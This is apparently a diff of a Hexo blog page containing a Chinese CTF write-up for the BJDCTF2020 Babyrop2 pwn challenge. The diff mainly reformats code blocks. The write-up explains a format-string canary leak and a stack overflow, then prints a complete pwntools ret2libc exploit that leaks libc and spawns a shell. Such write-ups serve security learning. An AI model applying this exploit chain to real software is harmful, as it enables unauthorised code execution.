@@ -30,122 +30,30 @@ if (window.localStorage.getItem('theme-mode') === 'dark')
  font-family: 'JetBrains Mono';
  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
 }</style><style>:root {
-  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --dark-background: url('/img/hope.jpg');
   --light-background: url('/img/bk.jpg');
-}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>BJDCTF2020 Babyrop2</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2022-08-29T03:19:00.000Z" id="date"> 2022-08-29</time></div></span></div></div><hr><div id="post-content"><p>最近这段时间应该会陆陆续续补上以前做的pwn题的wp，再来复习一下</p>
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>BJDCTF2020 Babyrop2</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2022-08-29T03:19:00.000Z" id="date"> 2022-08-29</time></div></span></div></div><hr><div id="post-content"><p>最近这段时间应该会陆陆续续补上以前做的pwn题的wp，再来复习一下</p>
 <h3 id="Involved-Knowledge"><a href="#Involved-Knowledge" class="headerlink" title="Involved Knowledge"></a>Involved Knowledge</h3><ul>
 <li>Format String</li>
 <li>Stackoverflow</li>
-<li>ret2libc</li>
+<li>ret2libc<h3 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec"></a>Checksec</h3></li>
 </ul>
-<h3 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec"></a>Checksec</h3><pre><code class="shell">    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x400000)
-</code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">Arch:     amd64-64-little<br>RELRO:    Partial RELRO<br>Stack:    Canary found<br>NX:       NX enabled<br>PIE:      No PIE (0x400000)<br></code></pre></td></tr></table></figure>
 <p>64位，开启了Canary(金丝雀)和NX(堆栈不可执行)，那么如果有canary的话，我们在进行rop时首先就是要泄露canary</p>
-<h3 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h3><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp)
-&#123;
-  init(argc, argv, envp);
-  gift();
-  vuln();
-  return 0;
-&#125;
-</code></pre>
+<h3 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h3><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init(argc, argv, envp);<br>  gift();<br>  vuln();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>main函数里面依次执行三个函数<code>init()</code>,<code>gift()</code>,<code>vuln()</code>，依次跟进</p>
-<h4 id="init"><a href="#init" class="headerlink" title="init()"></a>init()</h4><pre><code class="c">unsigned __int64 init()
-&#123;
-  unsigned __int64 v1; // [rsp+8h] [rbp-8h]
-
-  v1 = __readfsqword(0x28u);
-  setvbuf(stdout, 0LL, 2, 0LL);
-  setvbuf(stdin, 0LL, 1, 0LL);
-  puts(&quot;Can u return to libc ?&quot;);
-  puts(&quot;Try u best!&quot;);
-  return __readfsqword(0x28u) ^ v1;
-&#125;
-</code></pre>
+<h4 id="init"><a href="#init" class="headerlink" title="init()"></a>init()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">init</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v1 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Can u return to libc ?&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Try u best!&quot;</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v1;<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>setvbuf进行了初始化了输入输出流该如何缓冲，将缓冲置零</p>
-<h4 id="gift"><a href="#gift" class="headerlink" title="gift()"></a>gift()</h4><pre><code class="c">unsigned __int64 gift()
-&#123;
-  char format[8]; // [rsp+0h] [rbp-10h] BYREF
-  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
-
-  v2 = __readfsqword(0x28u);
-  puts(&quot;I&#39;ll give u some gift to help u!&quot;);
-  __isoc99_scanf(&quot;%6s&quot;, format);
-  printf(format);
-  puts(byte_400A05);
-  fflush(0LL);
-  return __readfsqword(0x28u) ^ v2;
-&#125;
-</code></pre>
-<p><code> __isoc99_scanf(&quot;%6s&quot;, format);  printf(format);</code></p>
+<h4 id="gift"><a href="#gift" class="headerlink" title="gift()"></a>gift()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">gift</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> format[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I&#x27;ll give u some gift to help u!&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%6s&quot;</span>, format);<br>  <span class="hljs-built_in">printf</span>(format);<br>  <span class="hljs-built_in">puts</span>(byte_400A05);<br>  fflush(<span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><code>__isoc99_scanf(&quot;%6s&quot;, format);
+ printf(format);</code></p>
 <p>这里有format string，我们可以尝试泄露出canary，通过gdb找到canary的偏移</p>
-<pre><code class="c">unsigned __int64 vuln()
-&#123;
-  char buf[24]; // [rsp+0h] [rbp-20h] BYREF
-  unsigned __int64 v2; // [rsp+18h] [rbp-8h]
-
-  v2 = __readfsqword(0x28u);
-  puts(&quot;Pull up your sword and tell me u story!&quot;);
-  read(0, buf, 0x64uLL);
-  return __readfsqword(0x28u) ^ v2;
-&#125;
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Pull up your sword and tell me u story!&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x64</span>uLL);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>这里是个stackoverflow，buf只有0x18大小，但是read的长度是0x64，我们可以在这里写ropchain</p>
 <p>分析到这里结束</p>
 <p>我们拿到canary后在rop时把canary放到它原来的位置上就行，后面跟上了p64(0)是因为还有8个字节才覆盖到返回地址，然后打ropchain</p>
-<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">    # Arch:     amd64-64-little
-    # RELRO:    Partial RELRO
-    # Stack:    Canary found
-    # NX:       NX enabled
-    # PIE:      No PIE (0x400000)
-
-from pwn import *
-from LibcSearcher import *
-context(os = &#39;linux&#39; , arch = &#39;amd64&#39; , log_level = &#39;debug&#39;)
-local = 1
-if local == 0:
-    io = remote(&#39;1.14.71.254&#39; , 28377)
-else:
-    io = process(&#39;/mnt/c/Users/M1sceden4/Desktop/pwn/babyrop2_bjdctf_2020&#39;)
-elf = ELF(&#39;/mnt/c/Users/M1sceden4/Desktop/pwn/babyrop2_bjdctf_2020&#39;)
-io.recvuntil(&quot;I&#39;ll give u some gift to help u!\n&quot;)
-payload = b&#39;%7$p&#39;
-io.sendline(payload)
-canary = int(io.recv(18) , 16)
-success(&#39;canary = &#39; + hex(canary))
-
-puts_got = elf.got[&#39;puts&#39;]
-puts_plt = elf.plt[&#39;puts&#39;]
-main = elf.sym[&#39;main&#39;]
-pop_rdi_ret = 0x0000000000400993
-ret = 0x00000000004005f9
-vuln = elf.sym[&#39;vuln&#39;]
-payload = b&#39;a&#39; * (0x20 - 0x8) + p64(canary) + p64(0) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
-io.recvuntil(&#39;Pull up your sword and tell me u story!\n&#39;)
-io.sendline(payload)
-puts_addr = u64(io.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))
-success(&#39;puts_addr = &#39; + hex(puts_addr))
-
-libc = LibcSearcher(&#39;puts&#39; , puts_addr)
-libc_base = puts_addr - libc.dump(&#39;puts&#39;)
-success(&#39;libc_base = &#39; + hex(libc_base))
-
-system = libc_base + libc.dump(&#39;system&#39;)
-bin_sh = libc_base + libc.dump(&#39;str_bin_sh&#39;)
-success(&#39;system = &#39; + hex(system))
-success(&#39;bin_sh &#39; + hex(bin_sh))
-payload = b&#39;a&#39; * (0x20 - 0x8) + p64(canary) + p64(0) + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
-io.recvuntil(&quot;I&#39;ll give u some gift to help u!\n&quot;)
-io.sendline(&#39;1&#39;)
-io.recvuntil(&#39;Pull up your sword and tell me u story!\n&#39;)
-io.sendline(payload)
-io.interactive()
-</code></pre>
-<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2022/08/29/jarvisoj-level3-x64/">← 下一篇 jarvisoj_level3_x64</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/08/28/%E9%95%BF%E5%9F%8E%E6%9D%AF2022-known-phi/">长城杯2022 known_phi 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Mykonos</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/Mykonos-x"><i class="fab fa-github" alt="Github"></i></a><a class="social" href="g0dzirrazhou@gmail.com"><i class="fa fa-envelope" alt="E-Mail"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Involved-Knowledge"><span class="toc-number">1.</span> <span class="toc-text">Involved Knowledge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Checksec"><span class="toc-number">2.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">3.</span> <span class="toc-text">Analyze</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main"><span class="toc-number">3.1.</span> <span class="toc-text">main</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#init"><span class="toc-number">3.2.</span> <span class="toc-text">init()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gift"><span class="toc-number">3.3.</span> <span class="toc-text">gift()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">4.</span> <span class="toc-text">EXP</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python">    <span class="hljs-comment"># Arch:     amd64-64-little</span><br>    <span class="hljs-comment"># RELRO:    Partial RELRO</span><br>    <span class="hljs-comment"># Stack:    Canary found</span><br>    <span class="hljs-comment"># NX:       NX enabled</span><br>    <span class="hljs-comment"># PIE:      No PIE (0x400000)</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span> , arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">0</span>:<br>    io = remote(<span class="hljs-string">&#x27;1.14.71.254&#x27;</span> , <span class="hljs-number">28377</span>)<br><span class="hljs-keyword">else</span>:<br>    io = process(<span class="hljs-string">&#x27;/mnt/c/Users/M1sceden4/Desktop/pwn/babyrop2_bjdctf_2020&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;/mnt/c/Users/M1sceden4/Desktop/pwn/babyrop2_bjdctf_2020&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;I&#x27;ll give u some gift to help u!\n&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;%7$p&#x27;</span><br>io.sendline(payload)<br>canary = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">18</span>) , <span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;canary = &#x27;</span> + <span class="hljs-built_in">hex</span>(canary))<br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>pop_rdi_ret = <span class="hljs-number">0x0000000000400993</span><br>ret = <span class="hljs-number">0x00000000004005f9</span><br>vuln = elf.sym[<span class="hljs-string">&#x27;vuln&#x27;</span>]<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span> - <span class="hljs-number">0x8</span>) + p64(canary) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)<br>io.recvuntil(<span class="hljs-string">&#x27;Pull up your sword and tell me u story!\n&#x27;</span>)<br>io.sendline(payload)<br>puts_addr = u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;puts_addr = &#x27;</span> + <span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span> , puts_addr)<br>libc_base = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>success(<span class="hljs-string">&#x27;libc_base = &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>system = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>success(<span class="hljs-string">&#x27;system = &#x27;</span> + <span class="hljs-built_in">hex</span>(system))<br>success(<span class="hljs-string">&#x27;bin_sh &#x27;</span> + <span class="hljs-built_in">hex</span>(bin_sh))<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span> - <span class="hljs-number">0x8</span>) + p64(canary) + p64(<span class="hljs-number">0</span>) + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)<br>io.recvuntil(<span class="hljs-string">&quot;I&#x27;ll give u some gift to help u!\n&quot;</span>)<br>io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Pull up your sword and tell me u story!\n&#x27;</span>)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2022/08/29/jarvisoj-level3-x64/">← 下一篇 jarvisoj_level3_x64</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/08/28/%E9%95%BF%E5%9F%8E%E6%9D%AF2022-known-phi/">长城杯2022 known_phi 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/2.png" alt="Logo"></a><h1 id="Dr"><a href="/">Mykonos</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/Mykonos-x"><i class="fab fa-github" alt="Github"></i></a><a class="social" href="g0dzirrazhou@gmail.com"><i class="fa fa-envelope" alt="E-Mail"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Involved-Knowledge"><span class="toc-number">1.</span> <span class="toc-text">Involved Knowledge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Checksec"><span class="toc-number">2.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">3.</span> <span class="toc-text">Analyze</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main"><span class="toc-number">3.1.</span> <span class="toc-text">main</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#init"><span class="toc-number">3.2.</span> <span class="toc-text">init()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gift"><span class="toc-number">3.3.</span> <span class="toc-text">gift()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">4.</span> <span class="toc-text">EXP</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
 lightGallery(document.getElementById('post-bg'), {
   plugins: [lgZoom,lgThumbnail],
   selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
